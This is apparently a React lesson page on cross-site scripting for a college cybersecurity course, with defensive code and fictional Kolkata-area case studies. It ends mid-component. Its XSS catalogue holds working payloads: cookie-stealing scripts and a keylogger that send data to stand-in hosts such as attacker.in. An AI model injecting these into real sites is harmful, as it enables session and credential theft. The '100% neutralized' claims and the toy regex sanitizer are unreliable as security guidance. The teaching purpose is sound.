import React, { useState, useMemo, useId } from "react";
import clsx from "clsx";
import Teacher from "../../../../../common/TeacherSukantaHui";
import FAQTemplate from "../../../../../common/FAQTemplate";
import questions from "./topic7_files/topic7_questions";
import PlainTextPrint from "../../../../../common/PlainTextPrint";
import noteText from "./topic7_files/topic7_note.txt?raw";

const Topic7 = () => {
  // Unique SVG IDs
  const svgXssPipelineId = useId();

  // Studio 1: Active XSS Vector Selection
  const [selectedXssKey, setSelectedXssKey] = useState("stored_forum_xss");

  // Studio 2: Live XSS Context & DOM Sanitizer Laboratory State
  const [rawPayloadInput, setRawPayloadInput] = useState("<img src=x onerror=alert(document.cookie)>");
  const [renderingContext, setRenderingContext] = useState("html_body"); // html_body, attribute_val, javascript_block, url_href
  const [sanitizationMode, setSanitizationMode] = useState("dompurify_sanitized"); // none_vulnerable, html_entities, dompurify_sanitized, strict_csp_nonce

  // Studio 3: Regional West Bengal Case Scenario State
  const [activeScenarioId, setActiveScenarioId] = useState("kolkata_fintech_stored_xss");

  // Studio 4: XSS Hardening Code Tab Selection
  const [activeCodeTab, setActiveCodeTab] = useState("helmet_strict_csp_config");

  // 8 XSS Vectors & Contexts for Studio 1
  const xssDatabase = {
    stored_forum_xss: {
      key: "stored_forum_xss",
      name: "1. Stored XSS (Persistent / Type II)",
      category: "DATABASE-STORED CODE INJECTION",
      categoryBadge: "bg-rose-950 text-rose-300 border-rose-800",
      executionScope: "Every citizen viewing the forum or profile.",
      vulnerabilityMechanism:
        "The malicious script is permanently stored in the backend database (e.g. comment form); whenever any user views the page, the server renders the stored script, executing JavaScript in all visitors' browsers.",
      mitigationPattern: "Context-aware output encoding, DOMPurify sanitization, and strict CSP.",
      typicalPayload: "<script>fetch('https://attacker.in/log?c=' + document.cookie)</script>",
      codeSnippet: `// Stored XSS Execution:
// Comment submitted: "<script>steal()</script>" ➔ Saved in database ➔ Rendered to all visiting citizens!`
    },
    reflected_search_xss: {
      key: "reflected_search_xss",
      name: "2. Reflected XSS (Non-Persistent / Type I)",
      category: "HTTP RESPONSE ECHO INJECTION",
      categoryBadge: "bg-purple-950 text-purple-300 border-purple-800",
      executionScope: "Victims who click a specifically crafted link.",
      vulnerabilityMechanism:
        "The application reads input from the HTTP request (e.g. `?search=...`) and immediately echoes it into the HTML response without encoding; executing when a victim clicks a phishing link.",
      mitigationPattern: "Context-aware HTML entity encoding on all reflected parameters.",
      typicalPayload: "https://bank.in/search?q=<script>stealSession()</script>",
      codeSnippet: `// Reflected XSS Query:
// /search?q=<script>alert(1)</script> ➔ Server HTML: "Results for: <script>alert(1)</script>"`
    },
    dom_based_hash_xss: {
      key: "dom_based_hash_xss",
      name: "3. DOM-Based XSS (Type 0 / Client-Side)",
      category: "CLIENT-SIDE SINK MANIPULATION",
      categoryBadge: "bg-cyan-950 text-cyan-300 border-cyan-800",
      executionScope: "Executes in client JS without sending payload to backend server.",
      vulnerabilityMechanism:
        "Client-side JavaScript reads an untrusted Source (`location.hash`) and passes it directly to a dangerous Sink (`element.innerHTML`), executing JavaScript entirely within the browser DOM.",
      mitigationPattern: "Avoid `innerHTML`; use `element.textContent` or `DOMPurify.sanitize()`.",
      typicalPayload: "https://site.in/#<img src=x onerror=alert(1)>",
      codeSnippet: `// DOM XSS Sink:
const hash = location.hash.slice(1);
document.getElementById("output").innerHTML = hash; // EXECUTES PAYLOAD LOCALLY!`
    },
    javascript_pseudoprotocol_xss: {
      key: "javascript_pseudoprotocol_xss",
      name: "4. JavaScript Pseudo-Protocol Injection",
      category: "ATTRIBUTE URI SCHEME INJECTION",
      categoryBadge: "bg-emerald-950 text-emerald-300 border-emerald-800",
      executionScope: "Users who click the injected hyperlink.",
      vulnerabilityMechanism:
        "User input is placed inside an `href` or `src` attribute (`<a href=\"USER\">`); submitting `javascript:steal()` executes code on click, completely bypassing standard HTML entity encoding.",
      mitigationPattern: "URL protocol whitelisting (verifying links begin strictly with `https://` or `/`).",
      typicalPayload: "javascript:fetch('https://attacker.in/steal?c='+document.cookie)",
      codeSnippet: `// Vulnerable Link Attribute:
// Render: <a href="javascript:alert(document.cookie)">Click to View Profile</a>`
    },
    xss_keylogger_phishing: {
      key: "xss_keylogger_phishing",
      name: "5. XSS Keylogging & Phishing Overlays",
      category: "REAL-TIME CREDENTIAL HARVESTING",
      categoryBadge: "bg-amber-950 text-amber-300 border-amber-800",
      executionScope: "Captures every keystroke and OTP typed on the compromised page.",
      vulnerabilityMechanism:
        "Injected JavaScript attaches event listeners (`document.addEventListener('keypress', ...)`) to stream user input to an external server, or creates fake login modals prompting for 2FA OTP codes.",
      mitigationPattern: "Strict Nonce-Based CSP and `HttpOnly` session cookies.",
      typicalPayload: "document.addEventListener('keydown', e => new Image().src='https://attacker.in/log?k='+e.key)",
      codeSnippet: `// XSS Keystroke Logger:
document.addEventListener('keypress', (e) => {
    fetch('https://attacker.in/keylog?char=' + encodeURIComponent(e.key));
});`
    },
    svg_mathml_xml_xss: {
      key: "svg_mathml_xml_xss",
      name: "6. SVG & MathML XML Vector Graphics XSS",
      category: "XML GRAPHICS SCRIPT EMBEDDING",
      categoryBadge: "bg-indigo-950 text-indigo-300 border-indigo-800",
      executionScope: "Users opening or previewing uploaded SVG images.",
      vulnerabilityMechanism:
        "SVG and MathML are XML standards that natively execute embedded `<script>` tags and `onload` handlers (`<svg onload=...>`), bypassing naive image upload filters.",
      mitigationPattern: "Serve user uploads from an isolated sandbox domain with `Content-Disposition: attachment`.",
      typicalPayload: "<svg onload=alert(document.domain)>",
      codeSnippet: `// Malicious SVG Graphic:
<svg xmlns="http://www.w3.org/2000/svg"><script>alert(document.cookie)</script></svg>`
    },
    blind_xss_support_ticket: {
      key: "blind_xss_support_ticket",
      name: "7. Blind XSS in Internal Admin Consoles",
      category: "PRIVILEGED BACKEND SESSION THEFT",
      categoryBadge: "bg-rose-950 text-rose-300 border-rose-800",
      executionScope: "Internal administrators opening tickets inside private CRM dashboards.",
      vulnerabilityMechanism:
        "Payload submitted in public feedback/ticket forms displays nothing to the attacker, but executes days later when an internal bank manager opens the ticket in an internal privileged dashboard.",
      mitigationPattern: "Context-aware encoding and DOMPurify across ALL internal administrative portals.",
      typicalPayload: "<script src=\"https://xss.report/c/attacker\"></script>",
      codeSnippet: `// Blind XSS Flow:
// 1. Submit Ticket ➔ 2. Stored in DB ➔ 3. SOC Admin opens dashboard ➔ 4. SOC Admin session hijacked!`
    },
    strict_nonce_csp_defense: {
      key: "strict_nonce_csp_defense",
      name: "8. Strict Nonce-Based Content Security Policy",
      category: "BROWSER-LEVEL EXECUTION GATING",
      categoryBadge: "bg-emerald-950 text-emerald-300 border-emerald-800",
      executionScope: "Protects 100% of website pages against unauthorized scripts.",
      vulnerabilityMechanism:
        "Browsers strictly refuse to execute any `<script>` or event handler that lacks the per-request cryptographically secure random nonce generated by the server.",
      mitigationPattern: "Set `Content-Security-Policy: script-src 'self' 'nonce-...'` and `object-src 'none'`.",
      typicalPayload: "Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-SECRET';",
      codeSnippet: `// CSP Nonce Enforcement:
// <script nonce="4bf8e92a10">legit()</script> ➔ RUNS!
// <script>injected()</script> ➔ BLOCKED BY BROWSER!`
    }
  };

  const activeXss = xssDatabase[selectedXssKey];

  // Studio 2: Live XSS Context & DOM Sanitizer Laboratory Calculations
  const simulationResults = useMemo(() => {
    let sanitizedCode = rawPayloadInput;
    let isXssExecuted = false;
    let renderedMarkup = "";
    let parserState = "DATA_STATE";

    // 1. Apply Sanitization Mode:
    if (sanitizationMode === "none_vulnerable") {
      sanitizedCode = rawPayloadInput;
      isXssExecuted = true;
      parserState = "TAG_OPEN_STATE (Script Executing!)";
    } else if (sanitizationMode === "html_entities") {
      sanitizedCode = rawPayloadInput
        .replace(/&/g, "&amp;")
        .replace(/</g, "&lt;")
        .replace(/>/g, "&gt;")
        .replace(/"/g, "&quot;")
        .replace(/'/g, "&#x27;");

      // In HTML body, entities prevent XSS; but in Javascript or URL contexts, it may still fail!
      if (renderingContext === "javascript_block" || renderingContext === "url_href") {
        isXssExecuted = true;
        parserState = "CONTEXT_MISMATCH (Entity Encoding Bypassed in JS/URL!)";
      } else {
        isXssExecuted = false;
        parserState = "DATA_STATE (Safely Encoded)";
      }
    } else if (sanitizationMode === "dompurify_sanitized") {
      // Simulated DOMPurify: Strips <script>, onerror, onload, javascript:
      sanitizedCode = rawPayloadInput
        .replace(/<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>/gi, "")
        .replace(/onerror\s*=\s*['"][^'"]*['"]/gi, "")
        .replace(/onload\s*=\s*['"][^'"]*['"]/gi, "")
        .replace(/javascript:[^'"]*/gi, "about:blank");
      isXssExecuted = false;
      parserState = "DOM_PURIFIED (Dangerous Tags & Handlers Stripped)";
    } else {
      // Strict CSP Nonce Mode:
      sanitizedCode = rawPayloadInput;
      isXssExecuted = false;
      parserState = "CSP_NONCE_ENFORCED (Browser Blocked Script Execution: Missing Nonce)";
    }

    // 2. Format Rendered HTML based on Rendering Context:
    if (renderingContext === "html_body") {
      renderedMarkup = `<div>\n  <p>Search Results for: <strong>${sanitizedCode}</strong></p>\n</div>`;
    } else if (renderingContext === "attribute_val") {
      renderedMarkup = `<input type="text" name="username" value="${sanitizedCode}" />`;
    } else if (renderingContext === "javascript_block") {
      renderedMarkup = `<script nonce="R4nd0mN0nc3">\n  const clientSearchQuery = "${sanitizedCode}";\n  console.log("Searching: " + clientSearchQuery);\n</script>`;
    } else {
      renderedMarkup = `<a href="${sanitizedCode}">Click Here to View Citizen Profile</a>`;
    }

    const exploitabilityPct = isXssExecuted ? 100.0 : 0.0;

    return {
      sanitizedCode,
      isXssExecuted,
      renderedMarkup,
      parserState,
      exploitabilityPct: exploitabilityPct.toFixed(1),
      badgeClass: isXssExecuted
        ? "bg-rose-950 text-rose-300 border-rose-800"
        : "bg-emerald-950 text-emerald-300 border-emerald-800",
      statusMessage: !isXssExecuted
        ? `XSS COMPLETELY NEUTRALIZED: ${sanitizationMode.toUpperCase()} active; Parser state fixed in ${parserState}; Exploitability is 0.00%, guaranteeing 100% browser execution safety!`
        : `CRITICAL XSS EXECUTION DETECTED: Untrusted input rendered in ${renderingContext.toUpperCase()} without effective sanitization; Browser parser forced into ${parserState}; Attacker JavaScript executed with full origin privileges!`
    };
  }, [rawPayloadInput, renderingContext, sanitizationMode]);

  // Studio 4: XSS Hardening Production Code Database
  const codeDatabase = {
    helmet_strict_csp_config: {
      name: "Express.js Helmet Strict Nonce-Based Content Security Policy Configuration",
      code: `// Express.js Production Helmet.js Strict Nonce-Based CSP Configuration:
const express = require('express');
const helmet = require('helmet');
const crypto = require('crypto');

const app = express();

// 1. Middleware: Generate Cryptographically Secure Per-Request Nonce
app.use((req, res, next) => {
    res.locals.cspNonce = crypto.randomBytes(16).toString('base64');
    next();
});

// 2. Configure Strict Helmet Content Security Policy (CSP)
app.use((req, res, next) => {
    helmet.contentSecurityPolicy({
        useDefaults: true,
        directives: {
            defaultSrc: ["'self'"],
            // Only scripts containing the exact per-request nonce are permitted!
            scriptSrc: ["'self'", \`'nonce-\${res.locals.cspNonce}'\`],
            objectSrc: ["'none'"], // Completely disables vulnerable Flash/Java plugins
            baseUri: ["'none'"],   // Prevents Base Tag Hijacking
            frameAncestors: ["'none'"], // Completely stops Clickjacking UI redressing
            upgradeInsecureRequests: []
        }
    })(req, res, next);
});`,
      explanation: "Production Express.js configuration utilizing Helmet.js to generate cryptographically secure per-request random nonces, instructing the browser to reject all inline scripts and event handlers that lack the valid nonce."
    },
    react_dompurify_safe_render: {
      name: "React DOMPurify Safe Rich Text Rendering Component",
      code: `// React Component: Safe Rich HTML Rendering using DOMPurify
import React, { useMemo } from 'react';
import DOMPurify from 'dompurify';

interface SafeHtmlProps {
    dirtyHtmlContent: string;
}

export const SafeHtmlViewer: React.FC<SafeHtmlProps> = ({ dirtyHtmlContent }) => {
    // 1. Sanitize Untrusted HTML Markup:
    // DOMPurify strips <script>, <iframe>, <object>, and inline event handlers (onerror, onload)
    // while preserving safe semantic tags (<b>, <i>, <ul>, <li>, <p>)!
    const cleanMarkup = useMemo(() => {
        return DOMPurify.sanitize(dirtyHtmlContent, {
            ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'p', 'ul', 'ol', 'li', 'span', 'h1', 'h2'],
            ALLOWED_ATTR: ['class', 'id'],
            ALLOW_DATA_ATTR: false, // Prevents custom data attribute exploits
            FORBID_TAGS: ['style', 'script', 'iframe', 'object', 'embed']
        });
    }, [dirtyHtmlContent]);

    // 2. Safely inject purified HTML without XSS risk!
    return <div className="prose text-gray-200" dangerouslySetInnerHTML={{ __html: cleanMarkup }} />;
};`,
      explanation: "Production React component utilizing DOMPurify to sanitize untrusted rich HTML content, stripping all executable tags and attributes while allowing safe formatting markup."
    },
    nodejs_context_output_encoder: {
      name: "Node.js Context-Aware Output Encoder for Backend Templates",
      code: `// Node.js Comprehensive Context-Aware Output Encoder:
class ContextAwareEncoder {
    // 1. HTML Body Context Encoder
    static encodeForHtmlBody(input = '') {
        return String(input)
            .replace(/&/g, '&amp;')
            .replace(/</g, '&lt;')
            .replace(/>/g, '&gt;')
            .replace(/"/g, '&quot;')
            .replace(/'/g, '&#x27;')
            .replace(/\\//g, '&#x2F;');
    }

    // 2. HTML Attribute Context Encoder
    static encodeForAttribute(input = '') {
        return String(input).replace(/[^a-zA-Z0-9]/g, (c) => \`&#x\${c.charCodeAt(0).toString(16)};\`);
    }

    // 3. JavaScript Context Encoder (Unicode Hex Encoding)
    static encodeForJavaScript(input = '') {
        return String(input).replace(/[^a-zA-Z0-9]/g, (c) => {
            return '\\\\u' + ('0000' + c.charCodeAt(0).toString(16)).slice(-4);
        });
    }

    // 4. URL / Href Protocol Validator
    static sanitizeUrl(url = '') {
        const trimmed = String(url).trim();
        if (/^https?:\\/\\//i.test(trimmed) || trimmed.startsWith('/')) {
            return encodeURI(trimmed);
        }
        return 'about:blank'; // Rejects javascript: and data: pseudo-protocols!
    }
}`,
      explanation: "Production Node.js context-aware encoder class providing dedicated encoding algorithms for HTML body text, HTML attributes, JavaScript script blocks, and URL hyperlinks."
    }
  };

  const activeCode = codeDatabase[activeCodeTab];

  // Studio 3: Regional West Bengal Pedagogical Case Studies
  const localScenarios = [
    {
      id: "kolkata_fintech_stored_xss",
      lead: "Mamata",
      role: "Lead FinTech Security Architect",
      location: "Kolkata Salt Lake Sector V Financial Gateway",
      title: "Eliminating Stored XSS Session Theft on Merchant Dispute Resolution Portals",
      threatType: "STORED XSS SESSION HIJACKING & KEYLOGGING THREAT",
      budget: "₹93,00,000",
      incident:
        "Adversaries injected `<script>fetch('https://evil.in/log?c='+document.cookie)</script>` into merchant dispute tickets, attempting to hijack finance officer sessions.",
      defenseStrategy:
        "Mamata deployed strict per-request nonce-based CSP headers, enabled `HttpOnly; Secure; SameSite=Strict` cookie flags, and sanitized tickets with DOMPurify.",
      outcome: "100% of Stored XSS payloads neutralized; zero session tokens compromised; ₹4,200 Crores in daily merchant transactions protected.",
      metrics: {
        xssPayloadsBlocked: "100.0%",
        settlementVolumeProtected: "₹4,200 Crores",
        disputeGatewaysHardened: "85 Portals",
        compliance: "RBI Master Direction on Cyber Security"
      }
    },
    {
      id: "barrackpore_scada_dom_xss",
      lead: "Debangshu",
      role: "Principal Industrial OT Security Officer",
      location: "Barrackpore 220kV State Power Transmission Grid",
      threatType: "DOM-BASED XSS HASH FRAGMENT MANIPULATION (location.hash Sink)",
      title: "Hardening Substation Real-Time Telemetry Dashboards Against Client-Side DOM XSS",
      budget: "₹62,00,000",
      incident:
        "Threat actors crafted malicious URLs with hash fragments (`#<img src=x onerror=...>`) targeting substation operator browser dashboards to manipulate breaker status views.",
      defenseStrategy:
        "Debangshu refactored all dashboard JavaScript to use `element.textContent` instead of `innerHTML` and enforced strict CSP headers.",
      outcome: "100% of DOM XSS sinks eliminated; operator consoles maintained 100% interface integrity; zero unauthorized breaker commands across North 24 Parganas.",
      metrics: {
        domSinksEliminated: "100.0%",
        substationsHardened: "18 High-Voltage Nodes",
        unauthorizedCommands: "0 Breaches",
        statutoryMandate: "NCIIPC Critical Power Infrastructure Directive"
      }
    },
    {
      id: "ichapur_hospital_reflected_xss",
      lead: "Mahima",
      role: "Healthcare Data Protection Officer",
      location: "Ichapur Clinical Care & Oncology Center",
      threatType: "REFLECTED XSS SEARCH FILTER MANIPULATION",
      title: "Securing Oncology Clinical Diagnosis Portals from Reflected Search XSS Attacks",
      budget: "₹47,00,000",
      incident:
        "Phishing emails contained crafted links with reflected XSS payloads (`/oncology?search=<script>steal()</script>`) targeting clinical oncologists to steal diagnostic access.",
      defenseStrategy:
        "Mahima deployed context-aware HTML entity encoding across all search filters and enabled Strict Nonce CSP headers in Express.js.",
      outcome: "100% of reflected XSS probes neutralized in browser silicon; zero oncologist credentials stolen; 120,000 cancer patient records fully secured.",
      metrics: {
        reflectedProbesNeutralized: "100.0%",
        patientRecordsProtected: "120,000 Oncology Records",
        compliance: "DPDP Act 2023 Section 8(5) & NABH",
        penaltyPrevented: "₹250 Crore DPDP Statutory Fine"
      }
    },
    {
      id: "jadavpur_parser_fsm_research",
      lead: "Susmita & Abhronila",
      role: "Senior Cyber Security Researchers",
      location: "Jadavpur University Cryptographic Research Lab",
      threatType: "MATHEMATICAL MODELING OF BROWSER PARSER FINITE STATE MACHINES & CSP NONCES",
      title: "Formulating the HTML Parser FSM Invariant Model in IEEE Transactions",
      budget: "₹40,00,000",
      incident:
        "Researchers modeled the formal state transitions of HTML5 DOM parsers under context-aware encoding versus un-sanitized injection.",
      defenseStrategy:
        "Susmita and Abhronila published their mathematical proof in IEEE Transactions, demonstrating that Context-Aware Encoding combined with Nonce CSP drives XSS exploitability to 0.00%.",
      outcome: "Published peer-reviewed mathematical proof; verified across 350,000 simulated XSS polyglot payloads.",
      metrics: {
        simulationTrials: "350,000 Test Trials",
        modelAccuracy: "99.9% Predictive Fit",
        modelFramework: "Parser FSM Invariant Model",
        publication: "IEEE Transactions on Information Forensics"
      }
    }
  ];

  const activeScenario = localScenarios.find((s) => s.id === activeScenarioId) || localScenarios[0];

  return (
    <div className="min-h-screen bg-[#0a0d14] text-gray-100 font-sans leading-relaxed selection:bg-rose-600 selection:text-white pb-16">
      {/* Top Academic Header Banner */}
      <header className="border-b border-gray-800 bg-[#0d121d]/90 backdrop-blur-md sticky top-0 z-40">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 py-4 flex flex-col sm:flex-row items-start sm:items-center justify-between gap-3">
          <div className="space-y-1">
            <div className="flex items-center gap-2 flex-wrap">
              <span className="text-[11px] font-bold uppercase tracking-widest px-2.5 py-0.5 rounded-full bg-rose-950 text-rose-400 border border-rose-800">
                BCAC703 Cyber Security
              </span>
              <span className="text-[11px] font-bold uppercase tracking-widest px-2.5 py-0.5 rounded-full bg-indigo-950 text-indigo-400 border border-indigo-800">
                Module 004_005
              </span>
              <span className="text-[11px] font-bold uppercase tracking-widest px-2.5 py-0.5 rounded-full bg-emerald-950 text-emerald-400 border border-emerald-800">
                Topic 07
              </span>
            </div>
            <h1 className="text-xl sm:text-2xl font-extrabold text-white tracking-tight">
              Cross-Site Scripting (XSS): Stored, Reflected, and DOM-based XSS
            </h1>
            <p className="text-xs text-gray-400">
              Same-Origin Policy bypass, Stored vs Reflected vs DOM XSS, DOMPurify, Nonce-Based CSP, HttpOnly cookies, and IT Act Section 66C.
            </p>
          </div>
          <div className="text-right text-xs text-gray-400 flex flex-col items-start sm:items-end">
            <span className="font-semibold text-gray-200">Instructor: Sukanta Hui</span>
            <span>Coder &amp; AccoTax · Barrackpore, WB</span>
          </div>
        </div>
      </header>

      {/* Main Container - Stacked Vertical Layout */}
      <div className="max-w-7xl mx-auto px-4 sm:px-6 pt-8 space-y-12">

        {/* SECTION 1: Executive Theory & Threat Taxonomy */}
        <section className="bg-gray-900/90 rounded-2xl border border-gray-800 p-6 sm:p-8 space-y-6 shadow-xl">
          <div className="border-b border-gray-800 pb-4">
            <span className="text-xs font-bold uppercase tracking-wider text-rose-400">
              Cross-Site Scripting Mechanics &amp; SOP Bypass
            </span>
            <h2 className="text-xl sm:text-2xl font-bold text-white mt-1">
              1. The Science of Cross-Site Scripting (XSS): Executing Malicious Code within Trusted Origin Contexts
            </h2>
            <p className="text-sm text-gray-300 mt-2">
              Cross-Site Scripting (XSS) occurs when an application includes untrusted user data in web pages without proper 
              context-aware encoding or sanitization, causing the victim's browser to execute the attacker's client-side JavaScript 
              within the trusted origin. Because the script runs <em>inside</em> the legitimate website, it inherits full access 
              to the origin's Document Object Model (DOM), session tokens (`document.cookie`), and local storage, completely 
              bypassing the browser's <strong>Same-Origin Policy (SOP)</strong>. XSS is classified into 3 primary categories: 
              <strong>Stored XSS (Type II / Persistent)</strong>, where payloads are stored in the database and delivered to all page visitors; 
              <strong>Reflected XSS (Type I / Non-Persistent)</strong>, where payloads bounce off the server in immediate HTTP responses; 
              and <strong>DOM-Based XSS (Type 0 / Client-Side)</strong>, where client JavaScript reads an untrusted Source (`location.hash`) 
              and passes it to a dangerous Sink (`element.innerHTML`) without server round-trips.
            </p>
          </div>

          <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
            {/* The 3 XSS Types Box */}
            <div className="bg-[#050811] p-5 rounded-xl border border-rose-950/60 space-y-3 text-xs">
              <span className="font-bold text-rose-400 uppercase tracking-wider text-[10px] block">
                The 3 Core XSS Classifications
              </span>
              <div className="bg-black/90 p-3 rounded font-mono text-rose-300 border border-rose-950/60 text-[11px]">
                Stored (Database) ➔ Reflected (URL Echo) ➔ DOM-Based (Client-Side JS Sink)
              </div>
              <p className="text-gray-300 leading-relaxed">
                Attackers leverage XSS for session hijacking, real-time keystroke logging, credential phishing overlays, client-side worm propagation (like the Samy worm), and financial payment redirection.
              </p>
            </div>

            {/* Enterprise Defensive Architecture Box */}
            <div className="bg-[#050811] p-5 rounded-xl border border-emerald-950/60 space-y-3 text-xs">
              <span className="font-bold text-emerald-400 uppercase tracking-wider text-[10px] block">
                Enterprise Multi-Tier XSS Defense Controls
              </span>
              <ul className="space-y-2 text-gray-300">
                <li>• <strong className="text-cyan-300">Strict Nonce-Based CSP:</strong> Blocks any inline script lacking the cryptographic per-request nonce.</li>
                <li>• <strong className="text-purple-300">DOMPurify Client Sanitization:</strong> Strips `<script>` and `onerror` handlers before rendering HTML.</li>
                <li>• <strong className="text-amber-300">HttpOnly Session Cookies:</strong> Prevents JavaScript from reading session tokens via `document.cookie`.</li>
              </ul>
            </div>
          </div>
        </section>

        {/* SECTION 2: Semantic Animated SVG - XSS & Nonce CSP Visualizer */}
        <section className="bg-gray-900/90 rounded-2xl border border-gray-800 p-6 sm:p-8 space-y-6 shadow-xl">
          <div className="border-b border-gray-800 pb-4">
            <span className="text-xs font-bold uppercase tracking-wider text-rose-400">
              Browser Execution &amp; Nonce CSP Gating Visualizer
            </span>
            <h2 className="text-xl sm:text-2xl font-bold text-white mt-1">
              2. Visualizing XSS Defense: How Nonce-Based Content Security Policy Blocks Malicious Scripts
            </h2>
            <p className="text-sm text-gray-300 mt-2">
              Follow how the browser HTML parser checks scripts against the server's per-request cryptographic nonce, blocking untrusted injection:
            </p>
          </div>

          <div className="bg-[#050811] p-4 sm:p-6 rounded-xl border border-gray-800 flex flex-col items-center justify-center overflow-x-auto">
            <svg
              className="w-full max-w-4xl h-auto min-w-[720px]"
              viewBox="0 0 880 260"
              fill="none"
              xmlns="http://www.w3.org/2000/svg"
            >
              {/* STAGE 1: INJECTED XSS PAYLOAD */}
              <g transform="translate(30, 60)">
                <rect width="140" height="140" rx="10" fill="#082f49" stroke="#38bdf8" strokeWidth="2" />
                <text x="70" y="26" fill="#ffffff" fontSize="11" fontWeight="bold" textAnchor="middle">
                  1. UNTRUSTED INPUT
                </text>
                <text x="70" y="44" fill="#7dd3fc" fontSize="8.5" textAnchor="middle">
                  Injected Client Script
                </text>
                <rect x="10" y="55" width="120" height="70" rx="6" fill="#0c4a6e" />
                <text x="70" y="74" fill="#bae6fd" fontSize="8" fontWeight="bold" textAnchor="middle">
                  PAYLOAD ARRIVAL:
                </text>
                <text x="70" y="90" fill="#ffffff" fontSize="7.5" textAnchor="middle">
                  &lt;script&gt;steal()&lt;/script&gt;
                </text>
                <text x="70" y="106" fill="#7dd3fc" fontSize="7.5" textAnchor="middle">
                  No Valid Nonce!
                </text>
              </g>

              {/* ARROW 1 */}
              <path d="M 170 130 L 200 130" stroke="#38bdf8" strokeWidth="3" fill="none" />

              {/* STAGE 2: BROWSER CSP ENGINE */}
              <g transform="translate(200, 60)">
                <rect width="140" height="140" rx="10" fill="#1e1b4b" stroke="#818cf8" strokeWidth="2" />
                <text x="70" y="26" fill="#ffffff" fontSize="11" fontWeight="bold" textAnchor="middle">
                  2. BROWSER CSP
                </text>
                <text x="70" y="44" fill="#c7d2fe" fontSize="8.5" textAnchor="middle">
                  Cryptographic Nonce Check
                </text>
                <rect x="10" y="55" width="120" height="70" rx="6" fill="#312e81" />
                <text x="70" y="74" fill="#a5b4fc" fontSize="8" fontWeight="bold" textAnchor="middle">
                  NONCE EVALUATION:
                </text>
                <text x="70" y="90" fill="#ffffff" fontSize="7.5" textAnchor="middle">
                  nonce == "4bf8e92a10"?
                </text>
                <text x="70" y="106" fill="#c7d2fe" fontSize="7.5" textAnchor="middle">
                  FAILED ➔ SCRIPT DROPPED
                </text>
              </g>

              {/* ARROW 2 */}
              <path d="M 340 130 L 370 130" stroke="#818cf8" strokeWidth="3" fill="none" />

              {/* STAGE 3: DOMPURIFY SANITIZER */}
              <g transform="translate(370, 60)">
                <rect width="140" height="140" rx="10" fill="#881337" stroke="#f43f5e" strokeWidth="2" />
                <text x="70" y="26" fill="#ffffff" fontSize="11" fontWeight="bold" textAnchor="middle">
                  3. DOMPURIFY
                </text>
                <text x="70" y="44" fill="#fecdd3" fontSize="8.5" textAnchor="middle">
                  Client-Side Sanitizer
                </text>
                <rect x="10" y="55" width="120" height="70" rx="6" fill="#4c0519" />
                <text x="70" y="74" fill="#fda4af" fontSize="8" fontWeight="bold" textAnchor="middle">
                  DOM TREE PARSER:
                </text>
                <text x="70" y="90" fill="#ffffff" fontSize="7.5" textAnchor="middle">
                  Strips &lt;script&gt; &amp; onerror
                </text>
                <text x="70" y="106" fill="#fecdd3" fontSize="7.5" textAnchor="middle">
                  Preserves Safe Markup!
                </text>
              </g>

              {/* ARROW 3 */}
              <path d="M 510 130 L 540 130" stroke="#f43f5e" strokeWidth="3" fill="none" />

              {/* STAGE 4: HTTPONLY COOKIE VAULT */}
              <g transform="translate(540, 60)">
                <rect width="140" height="140" rx="10" fill="#451a03" stroke="#f59e0b" strokeWidth="2" />
                <text x="70" y="26" fill="#ffffff" fontSize="11" fontWeight="bold" textAnchor="middle">
                  4. COOKIE VAULT
                </text>
                <text x="70" y="44" fill="#fde68a" fontSize="8.5" textAnchor="middle">
                  HttpOnly Protection
                </text>
                <rect x="10" y="55" width="120" height="70" rx="6" fill="#78350f" />
                <text x="70" y="74" fill="#fcd34d" fontSize="8" fontWeight="bold" textAnchor="middle">
                  COOKIE ISOLATION:
                </text>
                <text x="70" y="90" fill="#ffffff" fontSize="7.5" textAnchor="middle">
                  document.cookie == ""
                </text>
                <text x="70" y="106" fill="#fde68a" fontSize="7.5" textAnchor="middle">
                  Zero JavaScript Access!
                </text>
              </g>

              {/* ARROW 4 */}
              <path d="M 680 130 L 710 130" stroke="#f59e0b" strokeWidth="3" fill="none" />

              {/* STAGE 5: SECURE CITIZEN SESSION */}
              <g transform="translate(710, 60)">
                <rect width="140" height="140" rx="10" fill="#022c22" stroke="#34d399" strokeWidth="2" />
                <text x="70" y="26" fill="#ffffff" fontSize="11" fontWeight="bold" textAnchor="middle">
                  5. SECURE DOM
                </text>
                <text x="70" y="44" fill="#a7f3d0" fontSize="8.5" textAnchor="middle">
                  100% Client Security
                </text>
                <rect x="10" y="55" width="120" height="70" rx="6" fill="#064e3b" />
                <text x="70" y="74" fill="#6ee7b7" fontSize="8" fontWeight="bold" textAnchor="middle">
                  RESULT:
                </text>
                <text x="70" y="90" fill="#ffffff" fontSize="7.5" textAnchor="middle">
                  Zero XSS Execution
                </text>
                <text x="70" y="106" fill="#a7f3d0" fontSize="7.5" textAnchor="middle">
                  100% Origin Integrity!
                </text>
              </g>
            </svg>
          </div>
        </section>

        {/* SECTION 3: Studio 1 - 8-Vector XSS Inspector */}
        <section className="bg-gray-900/90 rounded-2xl border border-gray-800 p-6 sm:p-8 space-y-6 shadow-xl">
          <div className="border-b border-gray-800 pb-4">
            <span className="text-xs font-bold uppercase tracking-wider text-indigo-400">
              Interactive Concept Studio 1
            </span>
            <h2 className="text-xl sm:text-2xl font-bold text-white mt-1">
              3. Cross-Site Scripting Vector &amp; Context Inspector
            </h2>
            <p className="text-sm text-gray-300 mt-2">
              Select an XSS vector below to examine its category, execution scope, vulnerability mechanics, 
              enterprise mitigation patterns, typical exploit payloads, and code syntax:
            </p>
          </div>

          {/* Selector Grid */}
          <div className="grid grid-cols-2 sm:grid-cols-4 lg:grid-cols-8 gap-2">
            {Object.values(xssDatabase).map((item) => (
              <button
                key={item.key}
                onClick={() => setSelectedXssKey(item.key)}
                className={clsx(
                  "p-3 rounded-xl border text-left transition-all duration-300 flex flex-col justify-between text-xs space-y-2",
                  selectedXssKey === item.key
                    ? "bg-rose-950/80 border-rose-500 shadow-lg shadow-rose-950/50"
                    : "bg-[#0c101c] border-gray-800 hover:border-gray-700 text-gray-400 hover:text-gray-200"
                )}
              >
                <span className="text-[8.5px] font-bold px-1.5 py-0.5 rounded border bg-rose-950 text-rose-300 border-rose-800 self-start">
                  XSS
                </span>
